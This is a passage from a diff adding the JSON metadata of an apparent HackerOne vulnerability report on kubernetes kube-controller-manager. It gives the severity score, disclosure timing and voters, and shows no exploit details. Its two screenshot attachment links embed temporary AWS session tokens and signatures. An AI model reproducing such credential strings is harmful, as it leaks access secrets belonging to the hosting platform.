FtWlFHlgp4HX2Lvp3pyDK1NCGK4sIJipEbG15Dtkjb%2BLasvRqCS8CqBQM8U%2Bioase3l%2FFnWM7dax53w6UtT%2BdRKEGgZ8Y%2FwdR42WGR9WWo33SrtWQPDCM6%2Bo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0426f9df37c829edd0e1824c781a1f9150bb8c477a03a7d5cb8582ce99e0c805",
+      "file_size": 87826,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 685919,
+      "file_name": "json_response.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GsX24cJ33LhFGNPqX6ZgBXc7?response-content-disposition=attachment%3B%20filename%3D%22json_response.png%22%3B%20filename%2A%3DUTF-8%27%27json_response.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYSRTPENT%2F20260509%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260509T151703Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEB8aCXVzLXdlc3QtMiJIMEYCIQClnbG8vqYrSqzQXmDUUgMjhtuh58NLNeDsbWuSsRg1hgIhAPcxhE464d7O3V1HZ0%2FdXfm0KtSqutLgcx41x%2B7CTiarKrsFCOj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyStI%2FGQ7th1cnchbQqjwUnkogl7RDJ9CdGbaQOhpqMdqTgX4AfVCSGZTTue0rS7M5I0Mx5xsKGNVgjZKt75IewwfhhfHL%2FRAHBkrPAZW41%2BG8lI79wO9KS67s83JTwK2kp9gVFtonK2Jfh8PwIcLG29bYD7kEkke5ezJCHoDK2Jy%2BoTjc2QBE9n%2FScRs%2BpZHSp%2Bg9IKT87MqqGWmw1Dj4gBDXz7IQovNO2JnVjXoyLgGlo6UpUafdv90fYERh0eHtxN%2FIVhbM%2Fm713wPtYKOiI0I5oJI%2BHTe1a6q3fbt9Oqx0xD%2FuMJHAI68OXeFTFuATXBvZ65Yl2HNdmMn57synTIbWJs2z9tDqOR0%2BzRQ9rFvcy9E4FNotAoLt8%2BrYjMRY4zFLhqNtFY%2FWIjwDvsK34lC%2FPK1La3VelQTYIQKJwaDKsiXSGWsEtzi1NqITAfNI1v%2BIF7J3Zw9GPnJb9frHldcZC79b%2BC%2FCLzukzZXg1GCxrqyL%2FgvgyORrnXT6X1ny2x6caaZQnJuWKZFNigkKYBVyWq2abk19SEh3UErx9zBkW%2BBgvSwUbVSbgDqV7K%2BynWXRf4dt0S%2F8RXrFUAzt%2BA77T%2BJLiO4kmgR4FN3hE1Sis3JGXKBUOK1vPH7gD%2FEd7vOax16%2ForWCCoKmCxr5CAEfhu1CiyqCOHUboyxJXjebKNs3CO0TsGnb89QVMeX8ylZjtms20d%2FWlIvMRGgQpIhgTlHjJzYLgLtq0SF0T%2BEuOtQF8ElGvwSU5c2oqZrmimGylTc28DlV1ecDGmWhNiSsJ3tf4%2BM4rInVRc8QB4a5aovEQ0ctaWRG3pINYeGQ%2FiMnwgxlGZHw7ZdoMuP6d%2F9aNEeOd4fk9ZtkFnKDDVF%2FeQku4c%2FTNouMWEOx0MM2G%2Fc8GOrABaYsmgwPerzVWftd1ov9iT%2BKGD%2FORm0nrCHhFReLwdAYtJ3AnsqStoLtIZaTMJdjb19NlCTXTVRF1cHYsNgMzkL%2BEXYpZs1wH6tu5YrBExPqozNr51ev%2FtWlFHlgp4HX2Lvp3pyDK1NCGK4sIJipEbG15Dtkjb%2BLasvRqCS8CqBQM8U%2Bioase3l%2FFnWM7dax53w6UtT%2BdRKEGgZ8Y%2FwdR42WGR9WWo33SrtWQPDCM6%2Bo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8c3b78527f5d8e14d72c588d1013a7987c7111a87a5ddb0677c142e1360a193c",
+      "file_size": 37800,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-29T21:28:28.510Z",
+  "allow_singular_disclosure_after": -171654515.06591997,
+  "singular_disclosure_allowed": true,
+  "vote_count": 21,
+  "voters": [
+    "th3hidd3nmist",
+    "pretorian",
+    "reeverzax",
+    "toastycat",
+    "yinvi777",
+    "zeroxyele",
+    "virus0x01",
+    "asanso",
+    "zimmer75",
+    "0xffcourse",
+    "and 11 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32487,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/kube-controller-manager",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
